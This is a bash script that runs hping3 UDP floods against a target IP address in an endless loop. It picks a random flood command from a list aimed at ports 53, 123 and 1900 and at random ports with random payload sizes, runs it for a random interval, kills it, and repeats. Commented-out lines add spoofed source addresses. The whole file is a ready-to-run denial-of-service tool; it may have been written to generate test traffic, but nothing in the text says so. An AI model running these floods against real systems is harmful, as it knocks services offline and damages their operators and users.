#!/bin/bash

echo "Starting UDP Attacks on $TARGET_IP..."

UDP_ATTACKS=(
    "hping3 --udp --flood -p 53 $TARGET_IP"
    "hping3 --udp --flood -p 123 $TARGET_IP"
    "hping3 --udp --flood -p 1900 $TARGET_IP"
    "hping3 --udp --flood -p 53 $TARGET_IP -d 512"
    "hping3 -S --udp --icmp --flood $TARGET_IP"
    "hping3 --udp --flood -p $((RANDOM % 65535 + 1)) -d $((RANDOM % 500 + 100)) $TARGET_IP"  # UDP payload attack
    
    # "hping3 --udp --flood -p 53 --rand-source $TARGET_IP"
    # "hping3 --udp --flood -p 123 --rand-source $TARGET_IP"
    # "hping3 --udp --flood -p 1900 --rand-source $TARGET_IP"
    # "hping3 --udp --flood -p 53 --rand-source $TARGET_IP -d 512"
)

while true; do
    SLEEP_INTERVALS=("$((RANDOM % 11 + 5))" "$((RANDOM % 46 + 15))" "$((RANDOM % 31 + 60))")
    RANDOM_SLEEP=${SLEEP_INTERVALS[$((RANDOM % 3))]}
    RANDOM_INDEX=$((RANDOM % ${#UDP_ATTACKS[@]}))

    echo "Executing: ${UDP_ATTACKS[$RANDOM_INDEX]} for $RANDOM_SLEEP seconds..."

    eval "${UDP_ATTACKS[$RANDOM_INDEX]}" &
    sleep $RANDOM_SLEEP
    killall hping3

    sleep 8

done